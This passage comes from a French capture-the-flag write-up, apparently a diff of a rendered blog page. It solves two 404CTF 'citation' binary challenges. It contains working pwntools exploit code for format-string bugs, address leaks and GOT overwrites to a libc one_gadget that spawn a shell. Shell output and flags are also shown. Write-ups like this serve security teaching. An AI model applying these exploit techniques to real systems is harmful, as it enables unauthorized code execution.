+</span></span><span class="line"><span class="cl">    <span class="n">num_quote_val</span> <span class="o">=</span> <span class="mh">0xffffffff</span>
+</span></span><span class="line"><span class="cl">    <span class="n">chosen_index_val</span> <span class="o">=</span> <span class="mi">3</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">val</span> <span class="o">=</span> <span class="n">num_quote_val</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span> <span class="o">|</span> <span class="n">chosen_index_val</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">write_fmt</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">fmtstr_payload</span><span class="p">(</span><span class="n">fmtstr_buffer_offset</span><span class="p">,</span> <span class="p">{</span><span class="n">chosen_index</span> <span class="p">:</span> <span class="n">val</span><span class="p">}))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><p>Et on arrive bien à faire en sorte d&rsquo;accéder à la citation précise en bypassant le choix aléatoire, par exemple là on peut voir la citation d&rsquo;index 3:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">python3 wu.py HOST=challenges.404ctf.fr PORT=31719
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">[+] Opening connection to challenges.404ctf.fr on port 31719: Done
+</span></span><span class="line"><span class="cl">[*] Switching to interactive mode
+</span></span><span class="line"><span class="cl">Que souhaitez-vous écrire ?
+</span></span><span class="line"><span class="cl">[Vous] : 
+</span></span><span class="line"><span class="cl">Au moment où vous vous apprêtiez à écrire :   @                                                                                                                                                                                                                                                           \x00aaabaa0\xe1KVous remarquez des traces d&#39;une citation qui semble avoir été effacée.
+</span></span><span class="line"><span class="cl">Vous vous ravisez temporairement d&#39;écrire sur le livre en attendant d&#39;en savoir davantage.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">1: Lire une citation
+</span></span><span class="line"><span class="cl">2: Ecrire sur le livre
+</span></span><span class="line"><span class="cl">3: Compter le nombre de citations
+</span></span><span class="line"><span class="cl">4: Fermer le livre
+</span></span><span class="line"><span class="cl">&gt;&gt;&gt; $ 1
+</span></span><span class="line"><span class="cl">La vie est un mystère qu&#39;il faut vivre, et non un problème à résoudre.
+</span></span><span class="line"><span class="cl">    -- Gandhi
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">1: Lire une citation
+</span></span><span class="line"><span class="cl">2: Ecrire sur le livre
+</span></span><span class="line"><span class="cl">3: Compter le nombre de citations
+</span></span><span class="line"><span class="cl">4: Fermer le livre
+</span></span><span class="line"><span class="cl">&gt;&gt;&gt; $ 1
+</span></span><span class="line"><span class="cl">La vie est un mystère qu&#39;il faut vivre, et non un problème à résoudre.
+</span></span><span class="line"><span class="cl">    -- Gandhi
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">1: Lire une citation
+</span></span><span class="line"><span class="cl">2: Ecrire sur le livre
+</span></span><span class="line"><span class="cl">3: Compter le nombre de citations
+</span></span><span class="line"><span class="cl">4: Fermer le livre
+</span></span><span class="line"><span class="cl">&gt;&gt;&gt; $ 1
+</span></span><span class="line"><span class="cl">La vie est un mystère qu&#39;il faut vivre, et non un problème à résoudre.
+</span></span><span class="line"><span class="cl">    -- Gandhi
+</span></span></code></pre></div><p>Super! Maintenant il ne nous reste plus qu&rsquo;à trouver la dernière citation pour avoir le flag, pour celà j&rsquo;y suis allé un peu à tatons vu qu&rsquo;il n&rsquo;y avait pas de moyen apparent de trouver le nombre exact de citations dans le fichier. J&rsquo;ai itérer avec une valeur de <code>chosen_index</code> décroissante jusqu&rsquo;à tomber sur la valeur équivalent à la dernière citation:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">chosen_index</span> <span class="o">=</span> <span class="mh">0x004be130</span>
+</span></span><span class="line"><span class="cl"><span class="n">num_quote_val</span> <span class="o">=</span> <span class="mh">0xffffffff</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">i</span> <span class="o">=</span> <span class="mi">80400</span>
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">chosen_index_val</span> <span class="o">=</span> <span class="n">i</span>
+</span></span><span class="line"><span class="cl">    <span class="n">val</span> <span class="o">=</span> <span class="n">num_quote_val</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span> <span class="o">|</span> <span class="n">chosen_index_val</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">write_fmt</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">fmtstr_payload</span><span class="p">(</span><span class="n">fmtstr_buffer_offset</span><span class="p">,</span> <span class="p">{</span><span class="n">chosen_index</span> <span class="p">:</span> <span class="n">val</span><span class="p">}))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">citation</span> <span class="o">=</span> <span class="n">read_citation</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s2">&#34;404&#34;</span> <span class="ow">in</span> <span class="n">citation</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="n">citation</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2"> : </span><span class="si">{</span><span class="n">citation</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">i</span> <span class="o">-=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python3 stage_1.py HOST=CHALLENGES.404CTF.FR PORT=31719
+</span></span><span class="line"><span class="cl">[*] &#39;/home/kali/Desktop/404_Heap/citation&#39;
+</span></span><span class="line"><span class="cl">    Arch:     amd64-64-little
+</span></span><span class="line"><span class="cl">    RELRO:    Partial RELRO
+</span></span><span class="line"><span class="cl">    Stack:    Canary found
+</span></span><span class="line"><span class="cl">    NX:       NX enabled
+</span></span><span class="line"><span class="cl">    PIE:      No PIE (0x400000)
+</span></span><span class="line"><span class="cl">[*] &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;
+</span></span><span class="line"><span class="cl">    Arch:     amd64-64-little
+</span></span><span class="line"><span class="cl">    RELRO:    Partial RELRO
+</span></span><span class="line"><span class="cl">    Stack:    Canary found
+</span></span><span class="line"><span class="cl">    NX:       NX enabled
+</span></span><span class="line"><span class="cl">    PIE:      PIE enabled
+</span></span><span class="line"><span class="cl">[*] &#39;/lib64/ld-linux-x86-64.so.2&#39;
+</span></span><span class="line"><span class="cl">    Arch:     amd64-64-little
+</span></span><span class="line"><span class="cl">    RELRO:    Partial RELRO
+</span></span><span class="line"><span class="cl">    Stack:    No canary found
+</span></span><span class="line"><span class="cl">    NX:       NX enabled
+</span></span><span class="line"><span class="cl">    PIE:      PIE enabled
+</span></span><span class="line"><span class="cl">[+] Opening connection to CHALLENGES.404CTF.FR on port 31719: Done
+</span></span><span class="line"><span class="cl">[*] 80400 : 
+</span></span><span class="line"><span class="cl">    1: Lire une citation
+</span></span><span class="line"><span class="cl">[*] 80399 : 
+</span></span><span class="line"><span class="cl">    1: Lire une citation
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">[*] 80326 : 
+</span></span><span class="line"><span class="cl">    1: Lire une citation
+</span></span><span class="line"><span class="cl">[*] 80325 : 
+</span></span><span class="line"><span class="cl">    1: Lire une citation
+</span></span><span class="line"><span class="cl">[+] 404CTF{3H_813N!0U1_C357_M0N_V1C3.D3P141r3_357_M0N_P14151r.J41M3_QU0N_M3_H41553}
+</span></span><span class="line"><span class="cl">        -- Edmond Rostand
+</span></span><span class="line"><span class="cl">    1: Lire une citation
+</span></span><span class="line"><span class="cl">[*] Switching to interactive mode
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">2: Ecrire sur le livre
+</span></span><span class="line"><span class="cl">3: Compter le nombre de citations
+</span></span><span class="line"><span class="cl">4: Fermer le livre
+</span></span><span class="line"><span class="cl">&gt;&gt;&gt; [*] Got EOF while reading in interactive
+</span></span></code></pre></div><h3 id="seconde-partie">Seconde partie</h3>
+<p>Dans cette seconde partie, l&rsquo;objectif était bien de pop un shell, un autre binaire nous est fourni ainsi que la libc utilisé par sur la machine distante, voilà l&rsquo;énoncé:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Grâce à votre persévérance, vous avez réussi à retrouver la citation qui avait été effacée: « Eh bien ! oui, c’est mon vice. Déplaire est mon plaisir. J’aime qu’on me haïsse. » Cyrano semble vous avoir joué un mauvais tour. Après avoir exploré le café, vous apercevez un homme accoudé à une table. Son nez imposant vous étonne, et c&#39;est alors que vous réalisez que cet homme n&#39;est autre que Cyrano lui-même.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">En apprenant que vous aviez retrouvé la citation, vous voyez son visage s&#39;illuminer. Il vous dit alors: « Je cherchais celui qui saurait lire entre les lignes, car j&#39;ai besoin d&#39;un remplaçant, ne serait-ce que pour un temps, comprenez-vous. » Cyrano vous explique alors que votre mission consisterait à aider Christian dans sa déclaration d&#39;amour à Roxane, en lui soufflant les mots depuis le bas du balcon. Tout en vous confiant cette tâche, Cyrano vous avoue qu&#39;il ne pourrait supporter cette scène, portant lui-même Roxane dans son coeur.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Que faites-vous ?
+</span></span></code></pre></div><p>On lance ctfmate pour associer la libc fournie au binaire:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ctfmate -b une_citation_pas_comme_les_autres_2_2
+</span></span></code></pre></div><p>Voilà les protections utilisées par le binaire:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
+</span></span><span class="line"><span class="cl">Partial RELRO   Canary found      NX enabled    PIE enabled     No RPATH   RW-RUNPATH   76 Symbols        No    0               2               /home/kali/Desktop/404_Heap/second_stage/une_citation_pas_comme_les_autres_2_2
+</span></span></code></pre></div><p>Cette fois-ci le PIE est activé, il nous faudra probablement obtenir un leak de l&rsquo;adresse où est mappé le binaire. Jetons maintenant un oeil au programme et plus précisément à la fonction <code>help_christian</code> (les autres fonctions sont juste là pour l&rsquo;histoire):</p>
+<div>
+    <img src="assets/help_christian.PNG", style="max-width:100%;margin-left: 50%;transform: translateX(-50%);">
+</div>
+<p>On doit fournir en input une suite de phrase attendues par le programme, puis on peut avoir accès à deux appels à printf vulnérables à des format strings, idéalement une pour leak des adresses et l&rsquo;autre pour exploiter! On va déjà envoyer ce que le programme attend en input pour avoir accès aux format strings:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">exp</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># Helping christian</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;1</span><span class="se">\n</span><span class="s2">1</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Filling required speech</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;M&#39;accuser, - justes dieux ! - De n&#39;aimer plus... quand... j&#39;aime plus !&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;L&#39;amour grandit berce dans mon ame inquiete... Que ce... cruel marmot prit pour... barcelonnette !&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Aussi l&#39;ai-je tente, mais... tentative nulle. Ce... nouveau-ne, Madame, est un petit... Hercule.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;De sorte qu&#39;il... strangula comme rien... Les deux serpents... Orgueil et... Doute.&#34;</span><span class="p">)</span>
+</span></span></code></pre></div><p>Après le plan va être d&rsquo;exploiter le fait qu&rsquo;il n&rsquo;y ait pas de <code>Full RELRO</code> pour overwrite une adresse dans la <code>GOT</code> qui redirigera vers un one gadget de la libc:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">one_gadget ./libc.so.6   
+</span></span><span class="line"><span class="cl">0x4f2a5 execve<span class="o">(</span><span class="s2">&#34;/bin/sh&#34;</span>, rsp+0x40, environ<span class="o">)</span>
+</span></span><span class="line"><span class="cl">constraints:
+</span></span><span class="line"><span class="cl">  rsp <span class="p">&amp;</span> <span class="nv">0xf</span> <span class="o">==</span> <span class="m">0</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">rcx</span> <span class="o">==</span> NULL
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">0x4f302 execve<span class="o">(</span><span class="s2">&#34;/bin/sh&#34;</span>, rsp+0x40, environ<span class="o">)</span>
+</span></span><span class="line"><span class="cl">constraints:
+</span></span><span class="line"><span class="cl">  <span class="o">[</span>rsp+0x40<span class="o">]</span> <span class="o">==</span> NULL
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">0x10a2fc execve<span class="o">(</span><span class="s2">&#34;/bin/sh&#34;</span>, rsp+0x70, environ<span class="o">)</span>
+</span></span><span class="line"><span class="cl">constraints:
+</span></span><span class="line"><span class="cl">  <span class="o">[</span>rsp+0x70<span class="o">]</span> <span class="o">==</span> NULL
+</span></span></code></pre></div><h3 id="leak-de-la-libc-et-du-binaire">Leak de la libc et du binaire</h3>
+<p>Bon pour cette partie, vu que le leak s&rsquo;obtenait par une format string, il y&rsquo;a rien de très technique, j&rsquo;ai juste cherché les adresses qui m&rsquo;intéressait et les ait soustraits aux adresses de bases du binaire et de la libc respectivement:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Leaking binary / libc / stack address</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;sente donc la situation ?</span><span class="se">\n</span><span class="s2">[Vous] : &#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;%p&#34;</span> <span class="o">*</span> <span class="mi">48</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">leak</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">leak_libc</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="o">-</span><span class="mi">57</span><span class="p">:</span><span class="o">-</span><span class="mi">43</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mi">4118720</span>
+</span></span><span class="line"><span class="cl"><span class="n">leak_binary</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="o">-</span><span class="mi">29</span><span class="p">:</span><span class="o">-</span><span class="mi">15</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mi">7884</span>
+</span></span><span class="line"><span class="cl"><span class="n">help_christian</span> <span class="o">=</span> <span class="mh">0x00000970</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Binary mapped @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">leak_binary</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Libc mapped @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">leak_libc</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span></code></pre></div><p>Ensuite on applique la même technique que dans la première partie pour obtenir l&rsquo;offset du buffer de notre format string, ici il vaut 32.</p>
+<h3 id="obtention-du-shell">Obtention du shell</h3>
+<p>Le principal problème que j&rsquo;ai rencontré pour cette partie était que mon one_gadget qui était à l&rsquo;adresse <code>0x10a2fc</code> dans la libc demandait une contrainte telle que <code>[rsp + 0x70] == NULL</code>, condition qui, après l&rsquo;appel à pick_quote n&rsquo;était pas vérifiée.</p>
+<p>Pour palier à ce problème, au lieu de réécrire l&rsquo;adresse de <code>exit</code> dans la got avec celle de notre gadget, on va rediriger l&rsquo;appel à exit vers la fonction help_christian pour créer une nouvelle stackframe. Et vu que help_christian appelle printf, on réécrit l&rsquo;adresse de printf dans la got avec notre gadget.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Shelling a shell</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">exe</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak_binary</span>
+</span></span><span class="line"><span class="cl"><span class="n">exit_got</span> <span class="o">=</span> <span class="n">exe</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;got.exit&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">printf_got</span> <span class="o">=</span> <span class="n">exe</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;got.printf&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">one_gadget</span> <span class="o">=</span> <span class="mh">0x10a2fc</span>
+</span></span><span class="line"><span class="cl"><span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;One gadget @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">leak_libc</span> <span class="o">+</span> <span class="n">one_gadget</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">fmtstr_payload</span><span class="p">(</span><span class="n">buffer_offset</span><span class="p">,</span> <span class="p">{</span><span class="n">printf_got</span> <span class="p">:</span> <span class="n">leak_libc</span> <span class="o">+</span> <span class="n">one_gadget</span><span class="p">,</span> <span class="n">exit_got</span> <span class="p">:</span> <span class="n">leak_binary</span> <span class="o">+</span> <span class="n">help_christian</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><p>De cette manière on peut appeller notre one_gadget avec une nouvelle stackframe telle que <code>[rsp + 0x70] == NULL</code>.
+Et il ne reste plus qu&rsquo;à lancer le programme final:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">python3 exploit.py HOST=challenges.404ctf.fr PORT=30242
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] &#39;/home/kali/Desktop/404_Heap/second_stage/une_citation_pas_comme_les_autres_2_2&#39;
+</span></span><span class="line"><span class="cl">    Arch:     amd64-64-little
+</span></span><span class="line"><span class="cl">    RELRO:    Partial RELRO
+</span></span><span class="line"><span class="cl">    Stack:    Canary found
+</span></span><span class="line"><span class="cl">    NX:       NX enabled
+</span></span><span class="line"><span class="cl">    PIE:      PIE enabled
+</span></span><span class="line"><span class="cl">    RUNPATH:  b&#39;/home/kali/Desktop/404_Heap/second_stage&#39;
+</span></span><span class="line"><span class="cl">[*] &#39;/home/kali/Desktop/404_Heap/second_stage/libc.so.6&#39;
+</span></span><span class="line"><span class="cl">    Arch:     amd64-64-little
+</span></span><span class="line"><span class="cl">    RELRO:    Partial RELRO
+</span></span><span class="line"><span class="cl">    Stack:    Canary found
+</span></span><span class="line"><span class="cl">    NX:       NX enabled
+</span></span><span class="line"><span class="cl">    PIE:      PIE enabled
+</span></span><span class="line"><span class="cl">[*] &#39;/home/kali/Desktop/404_Heap/second_stage/ld-2.27.so&#39;
+</span></span><span class="line"><span class="cl">    Arch:     amd64-64-little
+</span></span><span class="line"><span class="cl">    RELRO:    Partial RELRO
+</span></span><span class="line"><span class="cl">    Stack:    No canary found
+</span></span><span class="line"><span class="cl">    NX:       NX enabled
+</span></span><span class="line"><span class="cl">    PIE:      PIE enabled
+</span></span><span class="line"><span class="cl">[+] Opening connection to challenges.404ctf.fr on port 30242: Done
+</span></span><span class="line"><span class="cl">[*] Binary mapped @ 0x55e02e400000
+</span></span><span class="line"><span class="cl">[*] Libc mapped @ 0x7fe803a08000
+</span></span><span class="line"><span class="cl">[*] One gadget @ 0x7fe803b122fc
+</span></span><span class="line"><span class="cl">[*] Switching to interactive mode
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">(Cyrano prends votre place et celle de Christian et poursuit la conversation avec Roxane.)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">(Vous ramassez des cailloux que vous jettez dans les vitres.)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[Roxane] : Qui donc m’appelle ?
+</span></span><span class="line"><span class="cl">[Christian] : Moi.
+</span></span><span class="line"><span class="cl">[Roxane] : Qui, moi ?
+</span></span><span class="line"><span class="cl">[Christian] : Christian.
+</span></span><span class="line"><span class="cl">[Roxane] : C&#39;est vous ?
+</span></span><span class="line"><span class="cl">[Christian] : Je voudrais vous parler.
+</span></span><span class="line"><span class="cl">[Roxane] : Non ! Vous parlez trop mal. Allez-vous-en !
+</span></span><span class="line"><span class="cl">[Christian] : De grâce !...
+</span></span><span class="line"><span class="cl">[Roxane] : Non ! Vous ne m’aimez plus !
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$ ls
+</span></span><span class="line"><span class="cl">flag.txt
+</span></span><span class="line"><span class="cl">une_citation_pas_comme_les_autres_2_2
+</span></span><span class="line"><span class="cl">$ cat flag.txt
+</span></span><span class="line"><span class="cl">404CTF{CYr4N0_713N7_14_CH4ND3113_M415_V0U5_3735_D3V3NU_UN_607}$
+</span></span></code></pre></div><h2 id="scripts-de-solve-complets">Scripts de solve complets</h2>
+<ul>
+<li>Première partie unintended</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># -*- coding: utf-8 -*-</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># this exploit was generated via</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 1) pwntools</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 2) ctfmate</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pwn</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">BINARY</span> <span class="o">=</span> <span class="s2">&#34;citation&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">LIBC</span> <span class="o">=</span> <span class="s2">&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">LD</span> <span class="o">=</span> <span class="s2">&#34;/lib64/ld-linux-x86-64.so.2&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Set up pwntools for the correct architecture</span>
+</span></span><span class="line"><span class="cl"><span class="n">exe</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="n">BINARY</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="n">LIBC</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">ld</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="n">LD</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#pwn.context.terminal = [&#34;tmux&#34;, &#34;splitw&#34;, &#34;-h&#34;]</span>
+</span></span><span class="line"><span class="cl"><span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">delete_corefiles</span> <span class="o">=</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl"><span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">rename_corefiles</span> <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl"><span class="n">p64</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span>
+</span></span><span class="line"><span class="cl"><span class="n">u64</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u64</span>
+</span></span><span class="line"><span class="cl"><span class="n">p32</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p32</span>
+</span></span><span class="line"><span class="cl"><span class="n">u32</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u32</span>
+</span></span><span class="line"><span class="cl"><span class="n">p16</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p16</span>
+</span></span><span class="line"><span class="cl"><span class="n">u16</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u16</span>
+</span></span><span class="line"><span class="cl"><span class="n">p8</span>  <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p8</span>
+</span></span><span class="line"><span class="cl"><span class="n">u8</span>  <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u8</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">host</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">HOST</span> <span class="ow">or</span> <span class="s1">&#39;127.0.0.1&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">PORT</span> <span class="ow">or</span> <span class="mi">1337</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">align_ptr</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">addr</span><span class="p">:</span> <span class="p">(</span><span class="n">addr</span> <span class="o">+</span> <span class="mi">4095</span><span class="p">)</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mi">4095</span>
